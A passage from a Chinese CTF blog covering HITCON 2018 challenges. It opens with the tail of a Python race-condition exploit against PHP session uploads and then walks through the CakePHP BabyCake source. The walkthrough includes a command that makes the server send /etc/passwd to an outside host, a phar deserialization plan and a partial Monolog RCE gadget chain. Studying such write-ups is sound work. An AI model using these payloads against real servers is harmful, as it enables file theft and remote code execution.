class="line">    x = b64encode(payload + junk)</span><br><span class="line">    xx = b64encode(b64encode(payload + junk))</span><br><span class="line">    xxx = b64encode(b64encode(b64encode(payload + junk)))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> x <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xx <span class="keyword">and</span> <span class="string">'='</span> <span class="keyword">not</span> <span class="keyword">in</span> xxx:</span><br><span class="line">        <span class="keyword">print</span> xxx</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner1</span><span class="params">(i)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">'PHP_SESSION_UPLOAD_PROGRESS'</span>: <span class="string">'ZZ'</span> + xxx + <span class="string">'Z'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        fp = open(<span class="string">'/etc/passwd'</span>, <span class="string">'rb'</span>)</span><br><span class="line">        r = requests.post(HOST, files=&#123;<span class="string">'f'</span>: fp&#125;, data=data, headers=headers)</span><br><span class="line">        fp.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">runner2</span><span class="params">(i)</span>:</span></span><br><span class="line">    filename = <span class="string">'/var/lib/php/sessions/sess_'</span> + sess_name</span><br><span class="line">    filename = <span class="string">'php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s'</span> % filename</span><br><span class="line">    <span class="comment"># print filename</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">'%s?orange=%s'</span> % (HOST, filename)</span><br><span class="line">        r = requests.get(url, headers=headers)</span><br><span class="line">        c = r.content</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">and</span> <span class="string">'orange'</span> <span class="keyword">not</span> <span class="keyword">in</span> c:</span><br><span class="line">            <span class="keyword">print</span> [c]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'1'</span>:</span><br><span class="line">    runner = runner1</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    runner = runner2</span><br><span class="line"></span><br><span class="line">pool = ThreadPool(<span class="number">32</span>)</span><br><span class="line">result = pool.map_async( runner, range(<span class="number">32</span>) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>hack_ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>php</tag>
        <tag>hitcon2018</tag>
      </tags>
  </entry>
  <entry>
    <title>hitcon2018受虐笔记三:BabyCake学习</title>
    <url>/2018/10/26/hitcon2018%E5%8F%97%E8%99%90%E7%AC%94%E8%AE%B0%E4%B8%89%20BabyCake%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>代码审计能力真是太太差了，下载下来一看20多M，当时就有点懵，最后连题目的业务逻辑处理过程都没有理解清楚….</p>
<p>拿到writeup之后，又自己分析了一遍，过程记录如下：</p>
<p>首先看到composer.json文件，知道代码使用了cakephp框架。</p>
<p>然后找源码的controller，主要业务逻辑的代码如下：</p>
<a id="more"></a>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> filename : /src/Controller/PagesController.php</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Core</span>\<span class="title">Configure</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Client</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">ForbiddenException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">Http</span>\<span class="title">Exception</span>\<span class="title">NotFoundException</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Cake</span>\<span class="title">View</span>\<span class="title">Exception</span>\<span class="title">MissingTemplateException</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DymmyResponse</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($headers, $body)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;headers = $headers;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body = $body;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PagesController</span> <span class="keyword">extends</span> <span class="title">AppController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">        $options = [</span><br><span class="line">            <span class="string">'headers'</span> =&gt; $headers,</span><br><span class="line">            <span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line">        $http = <span class="keyword">new</span> Client();</span><br><span class="line">        <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">back</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'pages'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_cache_dir</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $ip = <span class="keyword">$this</span>-&gt;request-&gt;getEnv(<span class="string">'REMOTE_ADDR'</span>);</span><br><span class="line">        $index = sprintf(<span class="string">'mycache/%s/%s/'</span>, $ip, $key);</span><br><span class="line">        <span class="keyword">return</span> CACHE . $index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">($key, $response)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="keyword">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"body.cache"</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"headers.cache"</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">"/body.cache"</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">"/headers.cache"</span>);</span><br><span class="line"></span><br><span class="line">            $body = <span class="string">"&lt;!-- from cache --&gt;\n"</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">display</span><span class="params">(...$path)</span> </span>&#123;</span><br><span class="line">        $request  = <span class="keyword">$this</span>-&gt;request;</span><br><span class="line">        $data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line">        $url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br><span class="line">        <span class="keyword">if</span> (strlen($url) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $scheme = strtolower(parse_url($url, PHP_URL_SCHEME) );</span><br><span class="line">        <span class="keyword">if</span> (strlen($scheme) == <span class="number">0</span> || !in_array($scheme, [<span class="string">'http'</span>, <span class="string">'https'</span>]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $method = strtolower($request-&gt;getMethod() );</span><br><span class="line">        <span class="keyword">if</span> ( !in_array($method, [<span class="string">'get'</span>, <span class="string">'post'</span>, <span class="string">'put'</span>, <span class="string">'delete'</span>, <span class="string">'patch'</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"></span><br><span class="line">        $headers = [];</span><br><span class="line">        <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">'host'</span>, <span class="string">'connection'</span>, <span class="string">'expect'</span>, <span class="string">'content-length'</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $key = md5($url);</span><br><span class="line">        <span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($response-&gt;headers <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strtolower($key) == <span class="string">'content-type'</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="keyword">array</span>(<span class="string">'type'</span> =&gt; $value));</span><br><span class="line">                <span class="keyword">$this</span>-&gt;response-&gt;type(<span class="string">'type'</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response-&gt;withHeader($key, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;response-&gt;body($response-&gt;body);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;response;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序主要会接收用户提交的两个参数data和url：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = $request-&gt;getQuery(<span class="string">'data'</span>);</span><br><span class="line">$url  = $request-&gt;getQuery(<span class="string">'url'</span>);</span><br></pre></td></tr></table></figure>

<p>然后获取用户的请求方式，支持<code>[&#39;get&#39;, &#39;post&#39;, &#39;put&#39;, &#39;delete&#39;, &#39;patch&#39;]</code>，然后利用同样的请求方式去请求url参数的地址，同时携带上data参数的内容，和用户的header。url支持的协议只有http和https：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !in_array($method, [<span class="string">'get'</span>, <span class="string">'post'</span>, <span class="string">'put'</span>, <span class="string">'delete'</span>, <span class="string">'patch'</span>]) )</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;back();</span><br><span class="line"> $headers = [];</span><br><span class="line"> <span class="keyword">foreach</span> ($request-&gt;getHeaders() <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">if</span> (in_array( strtolower($key), [<span class="string">'host'</span>, <span class="string">'connection'</span>, <span class="string">'expect'</span>, <span class="string">'content-length'</span>] ))</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">if</span> (count($value) == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            $headers[$key] = $value[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span> ($method == <span class="string">'get'</span>) &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;cache_get($key);</span><br><span class="line">            <span class="keyword">if</span> (!$response) &#123;</span><br><span class="line">                $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, <span class="keyword">null</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;cache_set($key, $response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $response = <span class="keyword">$this</span>-&gt;httpclient($method, $url, $headers, $data);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>但这里面对GET请求是单独处理的，因为对GET请求做了一个cache：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_set</span><span class="params">($key, $response)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> ( !file_exists($cache_dir) ) &#123;</span><br><span class="line">            mkdir($cache_dir, <span class="number">0700</span>, <span class="keyword">true</span>);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"body.cache"</span>, $response-&gt;body);</span><br><span class="line">            file_put_contents($cache_dir . <span class="string">"headers.cache"</span>, serialize($response-&gt;headers));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cache_get</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">        $cache_dir = <span class="keyword">$this</span>-&gt;_cache_dir($key);</span><br><span class="line">        <span class="keyword">if</span> (file_exists($cache_dir)) &#123;</span><br><span class="line">            $body   = file_get_contents($cache_dir . <span class="string">"/body.cache"</span>);</span><br><span class="line">            $headers = file_get_contents($cache_dir . <span class="string">"/headers.cache"</span>);</span><br><span class="line"></span><br><span class="line">            $body = <span class="string">"&lt;!-- from cache --&gt;\n"</span> . $body;</span><br><span class="line">            $headers = unserialize($headers);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DymmyResponse($headers, $body);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟一下如果不是GET请求，之后的代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">httpclient</span><span class="params">($method, $url, $headers, $data)</span> </span>&#123;</span><br><span class="line">    $options = [</span><br><span class="line">        <span class="string">'headers'</span> =&gt; $headers, </span><br><span class="line">        <span class="string">'timeout'</span> =&gt; <span class="number">10</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    $http = <span class="keyword">new</span> Client();</span><br><span class="line">    <span class="keyword">return</span> $http-&gt;$method($url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟踪一下POST请求的处理过程：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">filename: ./vendor/cakephp/cakephp/src/Http/Client.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($url, $data = [], array $options = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">        $url = <span class="keyword">$this</span>-&gt;buildUrl($url, [], $options);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(Request::METHOD_POST, $url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用了_doRequest方法，跟一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_doRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $request = <span class="keyword">$this</span>-&gt;_createRequest(</span><br><span class="line">        $method,</span><br><span class="line">        $url,</span><br><span class="line">        $data,</span><br><span class="line">        $options</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;send($request, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟踪_createRequest方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_createRequest</span><span class="params">($method, $url, $data, $options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $headers = <span class="keyword">isset</span>($options[<span class="string">'headers'</span>]) ? (<span class="keyword">array</span>)$options[<span class="string">'headers'</span>] : [];</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'type'</span>])) &#123;</span><br><span class="line">            $headers = array_merge($headers, <span class="keyword">$this</span>-&gt;_typeHeaders($options[<span class="string">'type'</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_string($data) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'Content-Type'</span>]) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">'content-type'</span>])) &#123;</span><br><span class="line">            $headers[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $request = <span class="keyword">new</span> Request($url, $method, $headers, $data);</span><br><span class="line">        $cookies = <span class="keyword">isset</span>($options[<span class="string">'cookies'</span>]) ? $options[<span class="string">'cookies'</span>] : [];</span><br><span class="line">        <span class="comment">/** <span class="doctag">@var</span> \Cake\Http\Client\Request $request */</span></span><br><span class="line">        $request = <span class="keyword">$this</span>-&gt;_cookies-&gt;addToRequest($request, $cookies);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'auth'</span>])) &#123;</span><br><span class="line">            $request = <span class="keyword">$this</span>-&gt;_addAuthentication($request, $options);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'proxy'</span>])) &#123;</span><br><span class="line">            $request = <span class="keyword">$this</span>-&gt;_addProxy($request, $options);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟踪<code>$request = new Request($url, $method, $headers, $data);</code>,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">filename:./vendor/cakephp/cakephp/src/Http/Client/Request.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 看Request 类的构造函数：</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url = <span class="string">''</span>, $method = self::METHOD_GET, array $headers = [], $data = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validateMethod($method);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uri = <span class="keyword">$this</span>-&gt;createUri($url);</span><br><span class="line">        $headers += [</span><br><span class="line">            <span class="string">'Connection'</span> =&gt; <span class="string">'close'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span> =&gt; <span class="string">'CakePHP'</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addHeaders($headers);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//看一下body方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">body</span><span class="params">($body = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($body === <span class="keyword">null</span>) &#123;</span><br><span class="line">            $body = <span class="keyword">$this</span>-&gt;getBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $body ? $body-&gt;__toString() : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line">            $formData = <span class="keyword">new</span> FormData();</span><br><span class="line">            $formData-&gt;addMany($body);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line">            $body = (string)$formData;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = <span class="keyword">new</span> Stream(<span class="string">'php://memory'</span>, <span class="string">'rw'</span>);</span><br><span class="line">        $stream-&gt;write($body);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream = $stream;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>$data</code>是一个数组，就会调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$formData = <span class="keyword">new</span> FormData();</span><br><span class="line">$formData-&gt;addMany($body);</span><br><span class="line"><span class="keyword">$this</span>-&gt;header(<span class="string">'Content-Type'</span>, $formData-&gt;contentType());</span><br><span class="line">$body = (string)$formData;</span><br></pre></td></tr></table></figure>

<p>跟踪一下<code>FromData</code>类的<code>addMany</code>函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMany</span><span class="params">(array $data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span><span class="params">($name, $value = null)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">'@'</span>) &#123;</span><br><span class="line">            trigger_error(</span><br><span class="line">                <span class="string">'Using the @ syntax for file uploads is not safe and is deprecated. '</span> .</span><br><span class="line">                <span class="string">'Instead you should use file handles.'</span>,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>$value</code>是用@开头的，则调用<code>addFile</code>方法:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span><span class="params">($name, $value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_hasFile = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="keyword">false</span>;</span><br><span class="line">        $contentType = <span class="string">'application/octet-stream'</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">            $content = stream_get_contents($value);</span><br><span class="line">            <span class="keyword">if</span> (stream_is_local($value)) &#123;</span><br><span class="line">                $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">                $metadata = stream_get_meta_data($value);</span><br><span class="line">                $contentType = $finfo-&gt;file($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">                $filename = basename($metadata[<span class="string">'uri'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">            $value = substr($value, <span class="number">1</span>);</span><br><span class="line">            $filename = basename($value);</span><br><span class="line">            $content = file_get_contents($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($value);</span><br><span class="line">        &#125;</span><br><span class="line">        $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">        $part-&gt;type($contentType);</span><br><span class="line">        <span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">            $part-&gt;filename($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>如果value不是resource，就会带入file_get_contents中处理，也就是说可以控制file_get_contents的参数，造成一个任意文件读取：</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">http <span class="link">http://13.230.134.135/\?url\=http://wonderkun.cc:8888/\&amp;data\</span>[<span class="string">x\</span>]\=@/etc/passwd 1=1</span><br></pre></td></tr></table></figure>

<p>在服务器端就可以收到/etc/passwd的内容。</p>
<p>因为可以完全控制file_get_contents的参数，所以可以利用 <code>phar://</code> 协议触发反序列化，进而 getshell。大致思路如下：</p>
<p>1.构造相应的 payload<br>2.将相应的 payload 放入某个 phar 文件中，并放到我们的服务器上<br>3.通过题目提供的功能访问我们服务器上的 phar 文件，此时相应文件被写入缓存中，具体路径为 <code>/var/www/html/tmp/cache/mycache/CLIENT_IP/MD5(http://IP/xxz.phar)/body.cache</code><br>4.通过 <code>post</code> 请求 <code>phar://</code> 协议的反序列化进而触发我们的 payload</p>
<p>看到vender中monolog，可以利用这个来构造执行链。</p>
<p><a href="https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php" target="_blank" rel="noopener">https://github.com/ambionics/phpggc/blob/master/gadgetchains/Monolog/RCE/1/gadgets.php</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Monolog</span>\<span class="title">Handler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">SyslogUdpHandler</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">socket</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;socket = $x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BufferHandler</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $handler;</span><br><span class="line">        <span class="keyword">protected</span> $bufferSize = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">protected</span> $buffer;</span><br><span class="line">        <span class="comment"># ($record['level'] &lt; $this-&gt;level) == false</span></span><br><span class="line">        <span class="keyword">protected</span> $level = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> $initialized = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment"># ($this-&gt;bufferLimit &gt; 0 &amp;&amp; $this-&gt;bufferSize === $this-&gt;bufferLimit) == false</span></span><br><span class="line">        